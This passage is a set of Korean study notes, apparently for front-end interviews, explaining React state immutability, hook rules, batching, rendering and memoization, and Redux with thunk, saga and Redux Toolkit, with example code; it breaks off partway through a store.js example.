- 왜 state를 직접 변경하지 않고 setState를 이용하나요?

  컴포넌트는 현재의 state와 setState를 얕은 비교(참조 비교)해서 setState의 참조가 바뀌게 되면 업데이트 됬다고 감지하게 되어 render 함수를 호출하는데, state를 직접 setState의 참조가 바뀌지 않아 render 함수를 호출하지 않게 되어 상태 변경이 일어나도 리렌더링이 일어나지 않는다. 즉 불변성이 지켜지지 않는 경우 리렌더링이 발생하지 않는다. 상태 변경을 추적하고 변경에 따라 구성 요소의 최신화를 유지하기 위해서는 반드시 setState를 사용해야 한다. (추가 내용 : setState를 통해 root.render 함수 호출 시 리렌더링이 되는 이유는 컴포넌트 return 함수 내부에서 최신 state 값이 포함된 React.createElement 함수를 호출하여 새로운 react element를 생성하는데 이 element들을 렌더링하는 것이 render 함수이다. 그렇기 때문에 state 값 변경 시 setState를 사용하여 render 함수가 정상적으로 호출되게 해야한다.)

- 객체, 배열 setState 시 spread 문법 사용 이유

  불변성은 변하지 않는 상태나 값을 말한다. 리액트에서의 불변성은 값을 직접적으로 변경을 하지 않고, 기존의 값을 수정하지 않으면서 새로운 값을 만들어내는 것을 의미한다. 원시 타입의 경우 값이 변경되는 경우 기존 값을 직접 변경하는 것이 아닌 콜스택에 새로운 메모리를 생성하여 새로운 메모리를 참조하도록 동작한다. 즉 불변성을 가지고 있다. 하지만 객체 타입의 경우 값이 변경되는 경우 메모리힙에 새로운 메모리를 생성하지않고 값을 직접 변경하도록 동작한다. 리액트에서는 이러한 객체 타입의 불변성을 지켜주고자 spread 문법을 사용했다. 리액트는 얕은 비교를 통해 state의 업데이트를 감지한다. 얕은 비교는 실제 내부 값까지 비교하는 것이 아닌 참조하는 값에 메모리 주소를 비교하는 것이다. 기존 값과 최신 값에 얕은 비교를 수행하여 최신 값이 새로운 메모리 주소를 참조할 때 업데이트가 발생하게 되는 것이다. 이 때 배열이나 객체의 상태를 업데이트 하는 경우 리액트에서는 새로운 메모리 주소를 생성하기 위해 setState에 배열이나 객체를 할당하고 배열이나 객체 내부에 스프레드 연산자를 활용한 기존 값의 복사본과 최신 값을 할당해준다. 이렇게 복사본을 활용한 방식과 새로운 메모리 주소를 생성하는 방식을 통해 불변성을 지킬 수 있고 불변성을 지켜줌으로서 예상치 못한 사이드 이펙트를 방지할 수 있고 얕은 비교를 통해 효과적인 상태 업데이트를 할 수 있다. 만약 불변성을 지키지 않고 기존 값을 직접 변경할 경우 참조하는 값에 메모리 주소가 동일하기 때문에 리액트는 상태 변화를 감지할 수 없어 컴포넌트의 최신화를 유지할 수 없게 된다. 이 때 setState의 동작 방식을 확인해보면 만약 setState로 이전 값과 동일한 값으로 업데이트한다고 했을 때 원시 타입의 경우 동일한 값이면 리렌더링이 발생하지 않고 객체 타입의 경우 동일한 값이라도 리렌더링이 발생하게 된다. 이유는 위와 같이 객체 타입의 경우 내부 값은 상관하지 않고 spread 문법을 통해 새로운 메모리 주소를 가진 데이터를 항상 만들어내기 때문에 이전 state와 최신 state 얕은 비교 시 참조 주소가 변경되었기 때문에 계속해서 리렌더링이 발생하는 것이다. 하지만 원시 타입의 경우 같은 값으로 업데이트되는 경우 이전 state와 최신 state는 여전히 동일한 메모리를 가리키고 있기 때문에 리렌더링이 발생하지 않는다.

  ```javascript
  const [user, setUser] = useState({ name: "Kim" });

  // 에러 케이스
  user.name = "Lee"; // 원본 직접 수정
  setUser(user); // 참조값은 그대로 → 리렌더링 x

  // 정상 케이스
  setUser({ ...user, name: "Lee" }); // 새로운 객체 생성 → 리렌더링 발생
  ```

- useState를 컴포넌트 최상위에서 사용하는 이유와 react hook을 조건문 등으로 감쌀 수 없는 이유

  React는 내부적으로 컴포넌트를 렌더링할 때 훅을 순서대로 호출하며 상태를 저장한다.

  ```jsx
  // 정상 예시
  function MyComponent() {
    const [count, setCount] = useState(0); // 첫 번째 훅
    const [name, setName] = useState(""); // 두 번째 훅

    return (
      <div>
        {count} {name}
      </div>
    );
  }

  // React는 이 컴포넌트를 렌더링하면서 이렇게 기억한다.
  // - 1번째 useState → count 상태
  // - 2번째 useState → name 상태
  ```

  즉, React는 훅이 어떤 변수에 들어가는지 이름은 기억 하지 않고 몇 번째 훅인지만 기억한다. 그렇기 때문에 아래와 같이 조건문 안에서 훅을 쓰게 되면 상황에 따라 count 훅이 호출되기도 하고 안 되기도 하기 때문에 React에서 name 훅을 다른 count로 인식하거나 아예 상태가 꼬여서 버그가 생기게 되는 것이다. 즉 훅의 호출 순서가 바뀌면 React가 상태를 잘못 연결하게 된다.

  ```jsx
  // 에러 예시
  function MyComponent() {
    if (someCondition) {
      const [count, setCount] = useState(0); // ❌ 조건문 안
    }
    const [name, setName] = useState("");
  }

  // 첫 번째 렌더링 (someCondition 조건 참) : 상태 1 -> count, 상태 2 -> name
  // 두 번째 렌더링 (someCondition 조건 거짓) : 상태 1 -> 없음, 상태 2 -> name
  ```

  그렇기 때문에 항상 컴포넌트 최상위에서 실행하여 useState 훅의 순서를 보장해야한다. 훅의 호출 순서를 고정시키기 위해서이다. 만약 조건에 따라 상태를 다르게 만들고 싶으면 아래와 같이 초기화할 수 있다. 아래와 같이 하면 훅의 순서는 유지되면서도 조건에 따라 상태를 다르게 설정할 수 있다. (useState에 콜백 함수를 넘기면, 컴포넌트가 처음 렌더링될 때 한 번만 실행된다.)

  ```jsx
  function MyComponent({ isLoggedIn }) {
    const [user, setUser] = useState(() => {
      if (isLoggedIn) {
        return { name: "홍길동" };
      } else {
        return null;
      }
    });

    return <div>{user ? user.name : "로그인 필요"}</div>;
  }
  ```

  useEffect, useRef 같은 다른 훅도 똑같은 규칙이 적용된다.

<br>

### # react batch update

setState는 비동기로 동작한다. 비동기로 동작하는 이유는 일정 시간동안 변화하는 상태를 모아 한번에 렌더링하기 위해서이다. 이러한 업데이트 방식을 배치 업데이트라고 한다. 리액트의 배치 업데이트(batch update)는 16ms(밀리세컨드)당 한번만 일어난다. 만약 배치 업데이트를 하지 않는다면 setState를 100번 연속 호출했을 때 100번의 리렌더링이 발생하여 성능 저하가 발생할 수 있다. 그러므로 react는 배치 업데이트를 사용하여 16ms마다 업데이트 된 state를 한번에 처리하여 리렌더링의 횟수를 줄여 성능을 향상시켰다. 하지만 배치 업데이트로 인해 state 업데이트 후 바로 state 값을 참조하여 다른 작업을 할 때 문제가 발생할 수 있다. 이런 경우 이전 state를 바로 참조할 수 있는 prevState를 활용하여 상태를 동기적으로 업데이트 한 후 사용하는 방식으로 해결 할 수 있다. prevState는 setState 인자로 함수를 전달하고 해당 함수의 파라미터로 이 전 state를 전달하는 방식으로 사용할 수 있다. (ex : `setState((prev) => prev + 1`)

<br>

### # react 렌더링 과정

1. Render Phase (렌더링 단계) -> 가상 DOM 생성 + 변경 감지 (Diffing + Reconciliation)

   Babel이 JSX를 react element 객체를 반환하는 React.createElement()로 변환하고

   ```jsx
   // 트랜스파일링 전
   const element = <h1>Hello</h1>;

   // 트랜스파일링 후
   // 결과는 순수 JavaScript 객체입니다 (React 엘리먼트 객체).
   const element = React.createElement("h1", null, "Hello");
   ```

   이후 ReactDOM.createRoot(container).render(element) 호출 시, React는 이 react 엘리먼트를 기반으로 내부적으로 새로운 Fiber Tree를 구성한다.

   ```jsx
   const root = ReactDOM.createRoot(document.getElementById("root"));
   root.render(<App />);
   ```

   그 후 이전 렌더링의 Fiber Tree와 비교(Diffing)하고 비교 결과를 기반으로 어떤 노드는 재사용, 삭제, 새로 생성할 지 재조정(Reconciliation)을 통해 판단한 뒤 최종 변경 사항을 메모리에 저장한다. 이때 실제 DOM은 절대 건드리지 않는다.

2. Commit Phase (커밋 단계) – 실제 DOM 업데이트 수행

   Render Phase에서 수집된 변경 사항(EffectList)을 기반으로 실제 DOM 트리에 컴포넌트를 마운트한다. 즉 실제 DOM 트리에 변경된 내용을 삽입하여 브라우저 HTML 요소로 표시하는 것이다. (컴포넌트 마운트 : 컴포넌트가 처음 렌더링되어 브라우저의 DOM에 추가되는 시점을 말한다.) 이 때 페인팅 단계 전 useLayoutEffect, 페인팅 단계 후 useEffect 등이 처리된다.

3. 화면에 실제 반영 (최종 렌더링)

   변경된 부분만 효율적으로 반영되어, 불필요한 DOM 조작이 줄어든다. 이후 이벤트 바인딩, useEffect, 애니메이션 등 후처리가 이뤄진다.

<br>

### # react 리렌더링 조건

- 기본 리렌더링 조건

  1. 부모 컴포넌트가 렌더링 될 때

  2. 자신의 state가 변경 될 때

  3. 자신이 전달받은 props가 변경될 때

- React에서 리렌더링을 막아야하는 경우

  무분별하게 막아야하기 보다는 필요한 상황에 막아야한다. 가상 돔을 사용하여 컴포넌트를 업데이트시키는데 이유없이 리렌더링을 막으려고 한다면 큰 이점없이 코드만 더 복잡해질 수 있다.

  - 사용자 입력값 유지 : 예: input에 사용자가 입력하는 중인데, 리렌더링으로 커서가 튀거나 값이 초기화됨.

  - 불필요한 API 호출 유발 : 리렌더링 될 때마다 useEffect 등으로 의도치 않은 네트워크 요청이 발생.

  - 무의미한 렌더링 반복 : 예: prop이 객체이고 참조값은 변했지만 내용은 동일 → 얕은 비교로 자식이 매번 리렌더링됨.

  - 비싼 연산을 포함한 컴포넌트 : 복잡한 차트, 대용량 리스트 등 렌더링 비용이 높은 컴포넌트가 자주 리렌더링되면 성능 저하 발생.

- React.createElement이란?

  - react는 `jsx 문법`을 사용하고 있다. jsx 문법은 js에 XML을 추가하여 확장한 문법이다. 브라우저에서 실행하기 전 번들링 과정 중 바벨을 사용하여 일반 자바스크립트로 변환되는데 이 자바스크립트 내부에서 `React.createElement` 를 호출하는데 `createElement` 는 react 엘리먼트를 생성하기 위한 정보를 담은 객체를 반환한다. createElement는 type, props, children 순으로 인자를 받아 react 엘리먼트를 생성한다.

    ```jsx
    // type : MyLabel(컴포넌트 이름), div(태그이름), input(태그이름)
    // props : 아래 예시에서는 객체 형태로 전달받고 있음
    // children : 아래 예시에서는 react 엘리먼트를 children으로 받고 있음
    return React.createElement(
      MyLabel,
      { label: "Here is the label prop" },
      React.createElement(
        "div",
        {},
        React.createElement("input", {
          type: "text",
          value: "And here is a child",
        })
      )
    );
    ```

  - reateElement를 통해 생성 된 엘리먼트 객체를 함수 컴포넌트의 return 문 내부에 배치(클래스형 컴포넌트의 경우 render 함수에 인자로 주어졌을 경우)하면 렌더링 과정에서 React DOM을 React 엘리먼트 객체와 일치하도록 DOM을 업데이트하여 화면에 그려주게 된다.

  - 화면에 그려지기 전 createElement 통해 생성한 엘리먼트는 정보를 담고 있는 `객체(object)`일 뿐이다. return 문 내부에 배치되어 렌더링 되기 전까지 어떤 것도 실행할 수 없는 단지 정보의 집합체인 것이다.

  - react 엘리먼트는 불변(immutable)하다. 즉 생성 후에는 엘리먼트의 자식, 속성 등을 변경할 수 없는 상수다. 따라서 엘리먼트 내용이 변경된다는 것은 createElement를 통해 변경(혹은 변경되지 않은)된 정보를 담아 `새로운 객체(object)를 생성`한다는 것을 의미한다.

- children과 렌더링

  - children이란?

    `children`은 커스텀 컴포넌트 태그 사이에 삽입되는 태그들을 컴포넌트 내부 props로 받아서 사용하는 객체를 말한다. 이 객체는 react element 객체이다. 대체로 모달이나 바텀시트와 같은 공통 컴포넌트를 만들 때 사용하거나 렌더링 최적화를 위해 사용한다.

  - children을 사용하는 컴포넌트에서 리렌더링 발생 시 children은 리렌더링 하지 않는 이유

    자식 컴포넌트를 사용할 때 `<Component />` 와 같이 컴포넌트 형태로 사용할 때는 리렌더링 발생 시 자식 컴포넌트의 `createElement` 가 새로 호출되어 자식 컴포넌트도 함께 리렌더링 되는 것이고 children 형태로 사용할 때는 새로 `createElement` 를 호출하는 것이 아닌 전달 받을 때 이미 호출 된 `createElement` 결과 값인 react 엘리먼트 객체를 전달받아 사용하기 때문에 자식 컴포넌트는 리렌더링이 발생하지 않는다.

  - children은 언제 사용하는 것이 좋을까?

    1. 부모 컴포넌트를 감싸고 있는 컨테이너가 빈번하게 렌더링 되지 않는 조건일 때 사용한다. 왜냐하면 이와 같은 환경에서 자식 컴포넌트를 children으로 받아오게 되면 컨테이너가 리렌더링 될 때 마다 부모 컴포넌트는 불가피하게 함께 리렌더링 되기 때문이다. 이런 경우 부모 컴포넌트 내부에서 자식 컴포넌트를 그대로 사용하고 부모 컴포넌트를 React.memo로 감싸 최적화할 수 있다.

    2. 반복적으로 쓰이는 디자인 레이아웃을 제작할 때 사용한다. 코드 재사용성을 극대화하여 생산성과 가독성을 증가시킬 수 있다.

- React.memo

  - React.memo란?

    React.memo는 props가 바뀌지 않으면 컴포넌트를 리렌더링하지 않도록 막는 고차 컴포넌트이다. 내부적으로 얕은 비교(shallow comparison)를 사용해서 props를 비교한다. 단 매번 변하는 props를 받아오는 컴포넌트나 레퍼런스가 계속 변하는 콜백 함수를 props로 받는 컴포넌트의 경우 React.memo를 사용하면 오히려 성능 저하가 올 수 있으므로 성능 향상의 이점이 있을 때에만 사용하는 것이 좋다.

  - children props를 전달 받는 컴포넌트에서 React.memo가 동작하지 않는 이유

    우선 React.memo는 참조 주소만 비교하는 얕은 비교를 통해 메모이징 된 컴포넌트를 사용할 지 결정하는데 children props를 사용하는 컴포넌트 내부에서 React.memo가 동작하지 않는다는 것은 props로 전달 받는 children의 참조 주소가 변경되었다는 것을 의미한다. 내부 children의 참조 주소가 변경되었기 때문에 메모이징한 컴포넌트를 사용하지 않는 것이다.

    children props를 자식 컴포넌트로 전달하는 부모 컴포넌트가 리렌더링 될 때 children props에 해당하는 컴포넌트의 createElement가 새로 호출된다. 부모 컴포넌트 내부에서 createElement가 새로 호출 되면 새로운 react 엘리먼트 객체를 리턴하게 되고 해당 객체를 다시 자식 컴포넌트의 children props로 전달하게 된다. 이렇게 되면 이전에 전달했던 react 엘리먼트 객체와 리렌더링 후 새롭게 생성 된 react 엘리먼트 객체의 참조는 다르게 되어 children을 사용하고 있는 자식 컴포넌트 내부에서는 React.memo가 동작하지 않게 된다.

<br>

### # 컴포넌트

- 컴포넌트에 대해 설명해달라

  재사용이 가능한 UI 구성 단위이다. 컴포넌트는 재사용이 가능하고, 개별로 관리되기 때문에 유지 보수에 좋고 렌더단(render 함수 내)에서 페이지 구성을 파악하기 편하다.

- 컴포넌트를 나누는 기준

  1. 페이지를 구성하는 요소 (nav, footer 등)

  2. 재사용이 필요한 반복되는 요소인 경우

  3. 한 컴포넌트 내에 코드 길이가 길어 가독성이 떨어지는 경우

<br>

### # Hooks

- Hooks

  공식 문서에서는 Hook은 함수 컴포넌트에서 React state와 생명주기 기능을 연동할 수 있게 해주는 함수라고 한다. react를 클래스 없이 사용할 수 있게 해준다. 클래스형 컴포넌트의 단점을 보완하기 위해 만들어졌다. 최상위 레벨에서 호출해야하며 함수 컴포넌트 내에서 호출해야한다.

- Hooks가 만들어진 이유는?

  클래스형 컴포넌트에

  1. extends와 super(props)를 매번 작성

  2. 함수, props 등 사용 시 매번 this에 bind 후 사용

  3. 고차 컴포넌트 지옥

  와 같은 문제로 인해 Hooks가 만들어지게 되었다.

- Hooks를 어떻게 사용했는지?

  useState, useEffect, useNavigate, useCallback, useMemo, useRef, useQuery, useInview, custom hook 등을 사용하였다.

- 클래스형 컴포넌트와 함수형 컴포넌트의 차이

  1. 선언 방식 (클래스 class로 시작하고 컴포넌트로 상속, 함수 일반 함수 생성과 동일)

  2. lifeCycle 관련 기능 사용 여부 (클래스 O, 함수 X)

  3. 메모리 자원 사용량 (클래스 > 함수)

  4. state, props 사용 방법 (클래스 this로 사용, 함수 this없이 사용)

<br>

### # 리덕스(Redux)

- 리덕스란

  리덕스 디자인 패턴은 FLUX 패턴이다. MVC 패턴의 단점으로 FLUX 패턴이 생겨났는데 MVC 패턴은 양방향 데이터 흐름을 가지고 있어 프로젝트 규모가 커지게 되면 구조가 매우 복잡해지고 예측 불가능한 결과를 나타낼 수 있다. 그래서 생겨난 것이 단방향 데이터 흐름을 가지고 있는 FLUX 패턴이다. FLUX 패턴의 데이터 흐름은 항상 Dispatcher -> Store -> View -> Action을 통해 다시 -> Dispatcher로 데이터가 흐르게 된다. 단방향 데이터 흐름의 장점은 데이터 변화에 따른 성능 저하 없이 DOM 객체 갱신이 가능하고 데이터 흐름이 단방향이기 때문에 코드를 이해하기 쉽고 데이터 추적과 디버깅이 쉽다. 단점은 변화를 감지하고 화면을 업데이트하는 코드를 매번 작성해야 한다는 단점이 있다.

- 리덕스 사용법 (https://ivorycode.tistory.com/entry/Redux%EC%9D%98-%ED%9D%90%EB%A6%84%EA%B3%BC-%EC%98%88%EC%A0%9C, https://devlog-h.tistory.com/14)

  1. 액션 생성 : 액션은 state의 액션을 정의한다. 리듀서는 이 액션을 참고하여 state를 어떻게 변화시킬 지 결정하게 된다.

     액션을 생성하기 위해 첫번째로 액션 타입을 정의하기 위한 액션 타입 변수를 생성한다. 변수의 자료형은 문자열을 사용한다.
     두번째로 액션 크리에이터를 생성한다. 액션 크리에이터는 타입, 페이로드(액션에 필요한 추가 데이터) 등을 포함하는 객체를 반환하는 함수이며
     타입에는 액션 타입을 정의하기 위해 생성한 액션 타입 변수를 할당한다. 또한 액션 크리에이터 함수는 디스패치를 통해 리듀서에 전달되는 함수이다.

     ```js
     // Actions
     const INCREMENT = "INCREMENT";
     const DECREMENT = "DECREMENT";

     // Action Creator
     export const increment = () => {
       return {
         type: INCREMENT,
       };
     };
     export const decrement = () => {
       return {
         type: DECREMENT,
       };
     };
     ```

  2. 리듀서 생성 : 리듀서는 액션의 결과를 보고 state를 업데이트시켜 반환한다.

     리듀서를 생성하기 위해 첫번째로 state의 초기 값을 정의하기 위한 initialState 변수를 생성한다.
     두번째로 리듀서를 생성하는데 리듀서는 함수로 생성되고 첫번째 인자로 state, 두번쨰 인자로 액션 크리에이터 함수를 전달받는다.
     이 때 첫번째 인자인 state는 미리 생성해놓은 initialState 변수를 할당하여 초기화시키고 리듀서는 컴바인리듀서에서 사용되야하므로 익스포트하여 내보낸다.
     state를 변경은 switch 문을 사용한다. 이 때 case에서 미리 생성해놓은 액션 타입 변수를 사용해서 실행되는 액션을 구분한다.

     ```js
     // 초기값 설정
     const initialState = {
       number: 0,
     };

     // counterReducer
     export default function counter(state = initialState, action) {
       switch (action.type) {
         case INCREMENT:
           return {
             number: state.number + 1,
           };
         case DECREMENT:
           return {
             number: state.number - 1,
           };
         default:
           return state;
       }
     }
     ```

  3. 컴바인리듀서 생성 : 컴바인리듀서는 모든 리듀서를 하나로 합쳐준다.

     컴바인 리듀서 생성을 위해 필요한 컴바인리듀서 함수, 생성해놓은 리듀서 함수를 임포트한다.
     그 후 컴바인리듀서 함수에 인자로 리듀서 함수를 객체로 전달하고 스토어 생성 시 사용해야하므로 익스포트하여 내보낸다.

     ```js
     export default combineReducers({
       // 리듀서 이름: import한 리듀서
       counterData: counter,
     });
     ```

  4. 스토어 생성 : 스토어는 state가 저장되는 저장소이다.

     스토어가 가지고 있는 state를 전체 컴포넌트에서 공유하기 위해서 최상위 컴포넌트에 스토어를 연결해야한다.
     스토어 연결을 위해 필요한 크리에이터스토어 함수, 프로바이더 컴포넌트, 컴바인리듀서 함수(네이밍은 rootReducer를 많이 사용)를 임포트한다. 그 후 store 변수를 생성하여 크리에이터스토어 함수를 할당하는데 인자로 컴바인리듀서 함수를 전달하고
     프로바이더 컴포넌트로 최상위 컴포넌트를 감싸고 프로바이더 컴포넌트 store 프롭스에 store 변수를 할당하여 스토어를 연결할 수 있다.

     ```jsx
     const store = createStore(rootReducer);

     ReactDOM.render(
       <Provider store={store}>
         <App />
       </Provider>,
       document.getElementById("root")
     );
     ```

  5. 디스패처 생성 : 디스패치는 리듀서에 액션을 전달한다.

     즉, state값을 업데이트할 때는 useDispatch hook을 사용한다.
     useDispatch hook을 사용하기 위해 필요한 useDispatch hook, 액션 크리에이터 함수를 임포트한다.
     그 후 dispatch 변수를 생성하고 useDispatch 함수를 할당하고
     특정 이벤트 리스너가 실행될 때 dispatch 변수에 액션 크리에이터 콜백함수를 인자로 전달하여 state를 업데이트할 수 있다.
     리듀서가 dispatch 변수를 통해 액션을 전달받아 state를 업데이트하게 되는 것이다.

     ```jsx
     export default function Counter() {
       const dispatch = useDispatch();

       return (
         <div>
           <button onClick={() => dispatch(increment())}> + </button>
           <button onClick={() => dispatch(decrement())}> - </button>
         </div>
       );
     }
     ```

  6. 셀렉터 생성 : 셀렉터는 스토어에 state를 가져온다.

     즉, state값을 사용할 때는 useSelector hook을 사용한다.
     useSelector hook을 사용하기 위해 필요한 useSelector hook을 임포트한다.
     그 후 새로운 변수를 생성하여 변수에 useSelector 함수를 할당하는데 인자로 화살표 함수를 전달한다.
     전달되는 화살표 함수에 파라미터는 state가 되고 리턴 값은 state.리듀서 이름.리듀서 리턴 객체 키 값이 된다.

     ```jsx
     export default function Counter() {
       const count = useSelector((state) => state.counter.number);

       return (
         <div>
           <h4>{count}</h4>
         </div>
       );
     }
     ```

- 리덕스 미들웨어란

  리덕스 미들웨어는 액션이 디스패치(dispatch) 된 후 리듀서가 해당 액션을 처리하기 전에 추가 작업(로깅, 비동기 처리, 에러 처리 등) 을 할 수 있도록 해주는 함수이다.
  Redux는 기본적으로 순수 함수인 리듀서를 기반으로 하기 때문에, 리듀서 안에서 직접 API 요청이나 타이머 같은 부수효과(side effect)를 처리할 수 없다.
  즉, dispatch(fetchUser())와 같은 액션을 날렸을 때 내부에서 비동기 로직을 처리해 상태를 변경하려면 미들웨어가 필요하다.
  미들웨어는 기본적으로 디스패치 함수를 감싸서 확장하는 고차 함수(Higher-Order Function) 형태로 작동하며, 이를 통해 액션을 가로채거나 변형하거나 비동기 작업을 처리할 수 있다.
  대표적인 리덕스 미들웨어 라이브러리로는 redux-thunk, redux-saga, redux-observable, redux-promise-middleware 등이 있습니다.

- redux-thunk

  - 개념

    redux-thunk는 액션 크리에이터가 객체가 아닌 함수를 반환할 수 있게 해주는 미들웨어이다. 이 함수는 dispatch, getState를 인자로 받아, 내부에서 비동기 작업을 처리하고,
    필요에 따라 여러 개의 액션을 순차적으로 dispatch할 수 있게 해준다.

  - 예시

    dispatch -> 액션을 디스패치할 수 있는 함수, getState -> 현재 Redux 상태 트리를 가져오는 함수(const state = getState())

    ```js
    // 썽크 액션 크리에이터 (비동기 처리)

    const fetchUser = (userId) => {
      return async (dispatch, getState) => {
        dispatch({ type: "FETCH_USER_REQUEST" }); // 1단계: 로딩 시작

        try {
          const res = await fetch(`/api/user/${userId}`); // 2단계: 비동기 API 호출
          const data = await res.json(); // 3단계: 응답 파싱
          dispatch({ type: "FETCH_USER_SUCCESS", payload: data }); // 4단계: 성공 액션
        } catch (err) {
          dispatch({ type: "FETCH_USER_FAILURE", error: err }); // 5단계: 실패 액션
        }
      };
    };

    store.dispatch(fetchUser(1)); // thunk 함수를 dispatch
    ```

- redux-saga

  - 개념

    redux-saga는 비동기 로직을 제너레이터 함수(generator function)를 사용해서 처리한다. 액션을 감지해서(take, takeLatest 등) 특정 사가(generator 함수)가 실행되고,
    그 안에서 call, put, delay 같은 이펙트 유틸을 사용해 명령형으로 비동기 로직을 다룬다.

  - 예시

    1. 버튼 클릭 → FETCH_USER_REQUEST 액션 디스패치

    2. 사가가 감지 → API 호출

    3. 성공하면 FETCH_USER_SUCCESS → 리듀서가 상태 업데이트 → 화면에 표시

    ```js
    // actions.js
    // 액션 타입
    export const FETCH_USER_REQUEST = "FETCH_USER_REQUEST";
    export const FETCH_USER_SUCCESS = "FETCH_USER_SUCCESS";
    export const FETCH_USER_FAILURE = "FETCH_USER_FAILURE";

    // 액션 생성자
    export const fetchUserRequest = (userId) => ({
      type: FETCH_USER_REQUEST,
      payload: userId,
    });

    export const fetchUserSuccess = (user) => ({
      type: FETCH_USER_SUCCESS,
      payload: user,
    });

    export const fetchUserFailure = (error) => ({
      type: FETCH_USER_FAILURE,
      error,
    });
    ```

    ```js
    // reducers.js
    import {
      FETCH_USER_REQUEST,
      FETCH_USER_SUCCESS,
      FETCH_USER_FAILURE,
    } from "./actions";

    const initialState = {
      loading: false,
      data: null,
      error: null,
    };

    export const userReducer = (state = initialState, action) => {
      switch (action.type) {
        case FETCH_USER_REQUEST:
          return { ...state, loading: true, error: null };
        case FETCH_USER_SUCCESS:
          return { ...state, loading: false, data: action.payload };
        case FETCH_USER_FAILURE:
          return { ...state, loading: false, error: action.error };
        default:
          return state;
      }
    };
    ```

    ```js
    // sagas.js
    import { call, put, takeLatest } from "redux-saga/effects";
    import {
      FETCH_USER_REQUEST,
      fetchUserSuccess,
      fetchUserFailure,
    } from "./actions";

    // API 호출 함수
    function fetchUserApi(userId) {
      return fetch(`https://jsonplaceholder.typicode.com/users/${userId}`).then(
        (res) => {
          if (!res.ok) throw new Error("Failed to fetch user");
          return res.json();
        }
      );
    }

    // 제너레이터 함수 (사가)
    function* fetchUserSaga(action) {
      try {
        const user = yield call(fetchUserApi, action.payload);
        yield put(fetchUserSuccess(user));
      } catch (e) {
        yield put(fetchUserFailure(e.message));
      }
    }

    // 액션 감시자 함수, 루트 사가에 등록해서 실행해야 한다.
    export function* rootSaga() {
      yield takeLatest(FETCH_USER_REQUEST, fetchUserSaga);
    }
    ```

    ```js
    // store.js
    import { createStore, applyMiddleware } from "redux";
    import createSagaMiddleware from "redux-saga";
    import { userReducer } from "./reducers";
    import { rootSaga } from "./sagas";

    // saga middleware 생성
    const sagaMiddleware = createSagaMiddleware();

    // store 생성
    export const store = createStore(
      userReducer,
      applyMiddleware(sagaMiddleware)
    );

    // saga 실행
    sagaMiddleware.run(rootSaga);
    ```

    ```jsx
    // App.js
    import React from "react";
    import { useDispatch, useSelector, Provider } from "react-redux";
    import { store } from "./store";
    import { fetchUserRequest } from "./actions";

    function App() {
      const dispatch = useDispatch();
      const user = useSelector((state) => state.data);
      const loading = useSelector((state) => state.loading);
      const error = useSelector((state) => state.error);

      const handleClick = () => {
        dispatch(fetchUserRequest(1)); // userId = 1
      };

      return (
        <div>
          <h1>User Info</h1>
          <button onClick={handleClick}>Fetch User</button>
          {loading && <p>Loading...</p>}
          {error && <p style={{ color: "red" }}>{error}</p>}
          {user && (
            <div>
              <p>Name: {user.name}</p>
              <p>Email: {user.email}</p>
            </div>
          )}
        </div>
      );
    }

    // Provider로 감싸기
    export default function Root() {
      return (
        <Provider store={store}>
          <App />
        </Provider>
      );
    }
    ```

- redux-thunk, redux-saga 비교

  | 상황          | Thunk             | Saga                                    |
  | ------------- | ----------------- | --------------------------------------- |
  | 프로젝트 크기 | 소규모            | 중/대규모                               |
  | 로직 복잡도   | 간단한 API 요청   | 복잡한 흐름 (요청 취소, 순차적 처리 등) |
  | 학습 곡선     | 낮음              | 높음                                    |
  | 코드 스타일   | 함수형, 간결      | 명령형, 유연                            |
  | 테스트        | 상대적으로 어려움 | 테스트 용이                             |

<br>

- Redux vs MobX vs ContextAPI vs Recoil vs Redux toolkit 비교

  (1) Redux : action, reducer, selector, store를 세팅하는 보일러플레이트 코드는 분명 유지보수에 큰 장점을 가지고 있기도 하지만, 상태의 개수가 적더라도 보일러플레이트 코드가 크기 때문에 불편함이 존재한다. 또한 리덕스의 경우 비동기 데이터 처리를 하기 위해서는 사가와 같은 별도의 라이브러리를 추가적으로 사용해야 한다. 또 데이터 관리에 대해 상당히 보수적인 접근방식을 취하고 있어 높은 러닝커브와 큰 보일러플레이트 코드를 가지고 있지만 확장 및 디버깅에 있어서는 엄청난 강점을 가지고 있다.

  (2) MobX : MobX의 경우 리덕스와 달리 store가 여러 개가 될 수 있어 분리가 용이해 편리할 수도 있는 반면 상태 변경시 다수의 스토어가 영향을 받을 수 있다. 또 리덕스와 다르게 스토어의 데이터를 액션의 발행없이 업데이트 할 수 있는데 구현은 쉽고 용이하지만 테스트나 유지보수의 측면에서는 문제를 일으킬 수도 있다. 그렇기에 장기적인 프로젝트, 유지보수 및 확장성을 고려해야 하는 프로젝트의 경우에는 적합하지 않다. 리덕스에 비해 러닝커브가 낮고 보일러플레이트 코드의 양 또한 적기 때문에 프로젝트의 규모가 크지 않은 경우 사용하기 좋다.

  (3) Context API : Context API는 리액트가 자체적으로 가지고 있다. 정적인 데이터 위주로 처리하거나 업데이트가 빈번하지 않을 때 적합하다. 빈번하고 복잡한 업데이트를 처리 시에는 비효율적이다.

  (4) Recoil : 리코일은 아톰과 셀렉터로 이루어져 있다. 아톰은 상태의 단위로, 유니크한 키값으로 구분된다. 해당 아톰을 구독하고 있으면 해당 컴포넌트들만 선택적으로 리렌더링 된다. 아톰의 상태변화는 순수함수를 통해 일어나는데, 이를 셀렉터라고 한다. 셀렉터에서는 비동기처리 뿐만 아니라 데이터 캐싱 기능도 제공하기 때문에 비동기 데이터를 다루기에도 용이하다. 하지만 상대적으로 최근에 나온 라이브러리이기 때문에 안정성 측면에서는 좋지 못할 수도 있다.

  (5) Redux toolkit : 리덕스는 큰 보일러 플레이트 코드를 가지고 있어 상태의 개수가 적어도 작성해야 할 코드가 많다. 또 비동기 데이터 처리를 하기 위해 별도의 라이브러리를 추가로 사용해야한다는 단점이 있다. 리덕스 툴킷은 리덕스가 공식적으로 만든 라이브러리로 다양한 내장 기능을 제공하고 있어 패키지 의존성이 적고 보일러 플레이트 코드가 적다는 장점이 있다.

<br>

- redux toolkit 사용법

  1. store파일을 생성한다. 파일명은 store로 한다. store는 전역 상태 관리가 되는 모든 createSlice를 관리하는 곳이다. store에 reducer에 만들어진 createSlice name을 import해서 넣어줘야한다. 또한 store를 만든 뒤 루트 디렉토리 컴포넌트(ex App컴포넌트)를 Provider 컴포넌트로 감싸 Provider prop를 store={store}로 지정해야한다. 또한 store는 프로젝트에 하나만 존재해야한다.

     ```js
     // store.js
     export const store = configureStore({
       reducer: {
         recommendIndex,
         searchValue,
       },
       devTools: process.env.NODE_ENV !== 'production',
